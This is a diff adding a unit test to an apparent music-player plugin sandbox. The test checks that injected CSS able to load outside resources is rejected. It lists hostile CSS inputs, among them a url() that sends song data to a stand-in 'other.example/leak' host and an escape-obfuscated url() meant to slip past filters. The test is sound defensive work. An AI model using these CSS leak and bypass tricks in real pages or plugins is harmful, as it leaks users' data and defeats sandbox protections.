@@ -153,6 +153,26 @@ describe("createExternalPlugin", () => {
     expect(await call("net.getJson", "https://music.youtube.com/")).toMatchObject({ ok: false });
   });
 
+  it("refuses page CSS that would load something, even with network", async () => {
+    const { ready, call, services } = setup(["ui.inject", "network"], ["api.example.com"]);
+    ready();
+    for (const css of [
+      'body { background: url("https://other.example/leak?song=x") }',
+      "body { background: URL (x) }",
+      '@import "https://other.example/a.css";',
+      'div { background-image: image-set("a.png" 1x) }',
+      'div { background-image: -webkit-image-set("a.png" 1x) }',
+      'div { content: image("a.png") }',
+      '@font-face { font-family: x; src("https://other.example/f.woff") }',
+      "body { background: u\\72 l(x) }",
+    ]) {
+      expect(await call("ui.injectCss", css), css).toMatchObject({ ok: false });
+    }
+    expect(services.ui.injectCss).not.toHaveBeenCalled();
+    // Plain styles still go in.
+    expect(await call("ui.injectCss", "ytmusic-player-bar { border-image-width: 0; color: red }")).toMatchObject({ ok: true });
+  });
+
   it("rejects unknown methods and malformed arguments", async () => {
     const { ready, call, services } = setup(["music.control", "ui.inject", "network"], ["a.example.com"]);
     ready();
